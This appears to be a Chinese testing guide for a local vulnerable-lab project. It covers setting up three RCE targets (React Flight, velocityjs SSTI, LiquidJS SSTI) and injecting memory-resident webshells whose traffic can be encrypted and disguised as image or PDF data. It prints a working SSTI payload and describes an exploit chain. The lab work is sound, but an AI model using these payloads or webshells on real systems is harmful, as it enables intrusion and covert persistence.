# Shallowend-Labs 靶场测试指引

> 本文写给后续对靶场进行测试的 Agent / 测试者：按顺序讲解每个环境的靶场信息
> （漏洞、目标、拓扑、端口）与注入方法。仓库本身的开源信息见 `README.md`，
> 仓库约定见 `AGENTS.md`。

## 0. 前置条件与通用流程

**前置条件**

- Docker + Docker Compose（镜像构建需要外网；国内网络在每个环境目录放 `.env`：
  `SHLABS_BUILD_PROXY=http://host.docker.internal:<port>`（`<port>` 为宿主代理端口），
  参考各环境 `.env.example`）
- Python 3 + `pip3 install requests python-socketio websocket-client`（注入器依赖）
- 可选：ShallowEnd 客户端（GUI 或 headless `--headless` 的 MCP 服务），用于内存马
  实连验收

**通用生命周期**（统一管理脚本，环境名可用 `base/` 目录名或 `shlabs.yml` 的 name 别名）

```bash
./shlabs.sh list                      # 列出全部环境（自动发现 base/*/shlabs.yml）
./shlabs.sh up <env>                  # 构建镜像 + 启动（首次构建较慢）
./shlabs.sh inject <env> --key mysecretkey            # 注入（内置漏洞版本校验门）
./shlabs.sh info <env>                # 环境详情
./shlabs.sh logs <env>                # 日志
./shlabs.sh down <env>                # 停止
./shlabs.sh clean <env>               # 停止并删除容器/网络/卷/镜像
```

**注入统一约定**（与 ShallowEnd 客户端一致）

| 参数 | 值 |
|------|-----|
| 默认密钥 | `mysecretkey` |
| Next-Action 头 | `17f8341226dbfd4f2ef424c64a475f1bb2e7c9b0`（SHA1(key)） |
| RC4 密钥 | `34d2e4255c8e6beb`（MD5(key)[:16]） |
| Shell 类型 | `emit`（`http.Server.prototype.emit` override 内存马，框架无关） |

`inject.sh` 会先执行**漏洞版本校验门**（读取容器内依赖版本，不在漏洞区间即报错退出，
防止上游漂移导致靶场静默失效），再调用 `injectors/` 下对应的注入器。

**注入器只做注入**（无 `--verify` 探针）：emit 壳把首个触发头请求的 body 当
core 源码 eval 入 `_cacheHandler` 槽位，任何"源码预热"式探针都会毒化内存马且
重注入无效（历史 PONG 探针即此缺陷）。注入成功标记（`SSTI_SHELL_OK:<pid>` /
flight `exploit ok!`）仅证明代码执行；连通性与健康验证统一由 ShallowEnd 连接期
（`webshell_test`：投递 core + `test` 调用断言）完成。

**ShallowEnd 侧验收（可选）**：MCP `webshell_create`（group_id=本地测试分组，
profile 匹配 rc4 + `mysecretkey`）→ `webshell_test` 实连。

## 0.1 高自由度流程：随机 Profile + 从 Profile 生成 Payload（推荐）

不注入注入器内置的默认壳，而是让 ShallowEnd 按**任意 profile 组合**生成壳再注入——
信封/加密/压缩全部随机可换，三个靶场通用：

```bash
# 1. 随机创建 Profile（MCP）：任选 encryption(rc4/aes/xor/chacha20) ×
#    request(json/form/image_png) × response(json/pngidat/pdfstream/gifdata) × compression
#    shallowend_profile_create → secret_key=<随机密钥>, encryption=..., ...
# 2. 从该 Profile 生成 emit 壳（关键：必须带 profile_id，壳的传输形态由 profile 烘入；
#    不带 profile_id 生成的壳只说 json 信封，配非 json profile 会 404/解析失败）
#    shallowend_payload_generate → profile_id=<上一步 id>, password=<同一随机密钥>, encryption=<同 profile>
# 3. 注入（key 用同一个随机密钥）：
./shlabs.sh inject <env> --key <随机密钥> --loader ~/Library/Caches/ShallowEnd/generated/<shell>.js
# 4. ShallowEnd 建连接（webshell_create 用该 profile → webshell_test → command_execute）
```

已验证的组合矩阵（2026-09-29，三靶场全通）：

| 靶场 | 加密 | 请求→响应 | 压缩 | 结果 |
|------|------|----------|------|------|
| CVE-2026-73649 | aes | form → gifdata | gzip | 连接 + 命令执行 ✓ |
| CVE-2025-55182 | chacha20 | json → pngidat | zlib | 连接 + 命令执行 ✓ |
| CVE-2026-45618 | rc4 | image_png → pdfstream | gzip | 连接 + 命令执行 ✓ |

> ⚠️ 互操作注意：二进制响应伪装（pdfstream/pngidat/gifdata）配 `compression=none`
> 时，客户端收到的命令输出是不解压的压缩字节——**二进制响应传输请配 gzip**。
>
> 注入器适配细节（对生成壳生效）：velocity 走 eval 完成值通道拿安装标记；
> liquid 走「第二条 return 型探测链」检测 emit override（`Server.prototype.emit`
> 不含 `[native code]` 即已劫持）；flight 直接把生成壳作为注入体。

---

## 1. base/CVE-2025-55182 — React Flight RCE（真实目标：RealWorld Conduit）

| 项 | 值 |
|----|-----|
| 漏洞 | CVE-2025-55182（React2Shell）：React 19 RSC Flight 反序列化 → `new Function`，CVSS 10.0 |
| 目标 | 前端 [cjfff/realworld-nextjs16](https://github.com/cjfff/realworld-nextjs16)（Next.js App Router，钉 `next@16.0.6`/`react@19.2.0`）+ 后端 [gothinkster/node-express-realworld-example-app](https://github.com/gothinkster/node-express-realworld-example-app)（Express + Prisma + PostgreSQL） |
| 拓扑 | `postgres` → `api`（127.0.0.1:21511）→ `front`（127.0.0.1:21501，**注入目标**）；front 与 api 共享网络命名空间，浏览器与 SSR 共用 `http://127.0.0.1:21511` |
| 触发面 | 任意 App Router 路由（`/` 即可）；flight 注入器向 `/` POST multipart Flight payload |
| 注入器 | `injectors/cve-2025-55182_flight.py` |

```bash
./shlabs.sh up CVE-2025-55182
# 等待 api 健康（首次启动含 migrate + seed，约 1-2 分钟）
curl http://127.0.0.1:21511/api/tags   # {"tags":[...]}  即 API 就绪
curl http://127.0.0.1:21501/           # 200 即前端就绪

./shlabs.sh inject CVE-2025-55182 --key mysecretkey
# 预期：版本门 OK（next@16.0.6 / react@19.2.0）→ exploit ok! → 连接信息输出

# ⚠️ flight 重注入需先重建容器（结构性限制）：exploit 请求自带 Next-Action 触发头
# （RSC action 路由依赖），驻留壳会拦截该头的一切请求 → 对已注入目标 exploit
# 恒得 200 空响应。先 `clean` / `down -v` 重建，再注入。
```

体验应用：浏览器打开 `http://127.0.0.1:21501`（Conduit 博客，注册任意账号即可）。

## 2. base/CVE-2026-73649 — velocityjs SSTI RCE（carrier：VeloForge）

| 项 | 值 |
|----|-----|
| 漏洞 | CVE-2026-73649：velocityjs ≤2.1.6 属性读取 → `Function` 构造器，CVSS 9.8（2.1.7 修复） |
| 目标 | `kind: carrier` 自写模板渲染服务（Koa + velocityjs 2.1.6）。真实目标不可得：唯一候选 carole-admin 依赖在漏洞区间，但其 Velocity 渲染均使用磁盘固定模板、用户输入不可达模板文本，不满足利用前提 |
| 拓扑 | 单服务 127.0.0.1:21503 |
| 触发端点 | `POST /api/render`，body `{"template": "...", "data": {"x": {}}}` |
| 注入器 | `injectors/cve-2026-73649_velocity.py` |

```bash
./shlabs.sh up CVE-2026-73649

# 最小 RCE 验证（任意 JS 执行）
curl -s http://127.0.0.1:21503/api/render \
  -H 'Content-Type: application/json' \
  -d '{"template":"#set($f=$x.constructor.constructor(\"return 6*7\"))#set($r=$f())$r","data":{"x":{}}}'
# 预期：{"result":"42"}

./shlabs.sh inject CVE-2026-73649 --key mysecretkey
# 预期：版本门 OK（velocityjs@2.1.6）→ Inject OK — memory shell resident in PID N
```

## 3. base/CVE-2026-45618 — LiquidJS SSTI RCE（真实目标：dungeon-revealer）

| 项 | 值 |
|----|-----|
| 漏洞 | CVE-2026-45618：liquidjs <10.26.0 `valueOf` gadget → `Function` 构造器，CVSS 10.0（**尚无补丁版本**）；10.25.7 同时暴露无补丁的 CVE-2026-44646 |
| 目标 | [dungeon-revealer](https://github.com/dungeon-revealer/dungeon-revealer)（TRPG 虚拟桌面，ISC，钉 `liquidjs@10.25.7`）：玩家聊天消息**原文**经 `parseAndRenderSync` 服务端渲染（`server/chat.ts`） |
| 拓扑 | 单服务 127.0.0.1:21504；GraphQL 走 **socket.io**（事件 `@graphql/execute` / `@graphql/result`），非 HTTP POST |
| 认证 | compose 不设 `PC_PASSWORD`/`DM_PASSWORD` → 应用默认开放 PC 角色；socket `authenticate`（空密码）→ `logIn` mutation（无密码，任意 id+name）后即可发聊天消息 |
| 注入器 | `injectors/cve-2026-45618_liquid.py`（python-socketio 客户端；内存马 shell body 经 `chatMessageCreate` 的 `variables` 传入 `vars.p`，链模板回显执行结果） |

利用链形态（注入器内置，GHSA-gf2q-c269-pqgc PoC 改编）：`1|valueOf` 拿到完整
context → `group_by`/`where`/`first|last` gadget 读取内部函数 → 覆写作用域比较算子
→ `m == payload` 触发 `Function(payload)()`。

```bash
./shlabs.sh up CVE-2026-45618
curl -o /dev/null -w '%{http_code}' http://127.0.0.1:21504/   # 200 即就绪

./shlabs.sh inject CVE-2026-45618 --key mysecretkey
# 预期：版本门 OK（liquidjs@10.25.7）→ Inject OK — memory shell resident in PID N
```

最小 PoC（任意 JS 执行，不经 socket.io）：聊天渲染即 Liquid 渲染，本地可单独验证
链路——`new Liquid({...DR 同款 fs stub})` 上执行 `injectors/cve-2026-45618_liquid.py`
内 `CHAIN_TEMPLATE`（`vars.p` 传 `return 6*7;`），输出 `42`。

## 4. 常见问题

| 症状 | 处置 |
|------|------|
| 构建期 git clone / npm 超时 | 环境目录 `.env` 设置 `SHLABS_BUILD_PROXY`（容器内经 `host.docker.internal` 用宿主代理）；基础镜像缺失时先 `docker pull`（国内可用 `docker.m.daocloud.io/library/<image>` 后 `docker tag`） |
| 版本校验门失败（Version gate FAILED） | 上游依赖漂移到了已修补版本——`./shlabs.sh clean <env>` 后重建镜像；仍失败则说明上游结构变化，回查 `patches/` |
| 端口被占用 | `docker ps` 查残留容器（尤其改名前的旧项目名容器）；`docker rm -f <name>` |
| RealWorld API 起不来（seed 段错误） | 必须用 Debian 系基础镜像（`Dockerfile.api` 已固定 node:20-slim）；seed 已顺序化（`patches/seed-sequential.patch`） |
| dungeon-revealer 构建期 apt 404 | node:16 基于 bullseye（2026-08 已归档），Dockerfile 已固定切 archive.debian.org 且删除 bullseye-security 源 |
| 注入成功但 ShallowEnd 连不上 | 内存马驻留在**进程**里；容器重启/`down` 后需重新注入。多进程容器（cluster 模式）注意注入的 PID 是否对外服务进程 |
| flight 重注入返回 200 空响应 | 结构性限制：exploit 请求自带 Next-Action 触发头，驻留壳拦截该头的一切请求——先 `clean` / `down -v` 重建容器再注入 |

## 4.1 Mem Pipe 交互终端 e2e（主仓）

ShallowEnd 主仓有两个 pipe e2e 用例（`PIPE_E2E=1 go test -tags e2e ./internal/app/ -run <name>`），
按目标侧 profile 自适应，互斥跳过：

| 用例 | 需要 | 跳过条件 |
|------|------|----------|
| `TestMemPipeE2E`（PTY 全链路） | 目标装有 util-linux(script) + bash | 目标降级 pipe profile 时 skip |
| `TestMemPipeFallbackProbe`（pipe fallback 可用性） | 纯净 alpine（无 util-linux） | 目标为 PTY profile 时 skip |

55182/73649 的 runtime 镜像已固化 `apk add util-linux bash`（PTY 主路径），默认跑前者；
要测 fallback 需临时去掉 Dockerfile 里的 apk add 行再 `up`（up 会自动重建检测到
Dockerfile 变化的镜像）。

注意：payload 安装是**一次性**的（emit 壳仅在 `_cacheHandler === undefined` 时安装），
主仓 payload 模板改动生效必须重新 `inject`（容器重启或 `clean && up` 后再注入）；
同一存活 payload 上重复跑 e2e 需主仓侧 seq 分配器播种晚于上次运行（2026-10-10 起已墙时钟播种）。

## 5. 验收口径

每个环境的最小验收 = `./shlabs.sh up <env>` 服务健康 + `./shlabs.sh inject <env>`
返回注入成功标记（`SSTI_SHELL_OK:<pid>` / flight `exploit ok!`）。
完整验收 = ShallowEnd 客户端（MCP `webshell_test`）实连成功并可执行命令（连接期
验证覆盖壳接管、core 投递与协议回环，是唯一权威口径）。
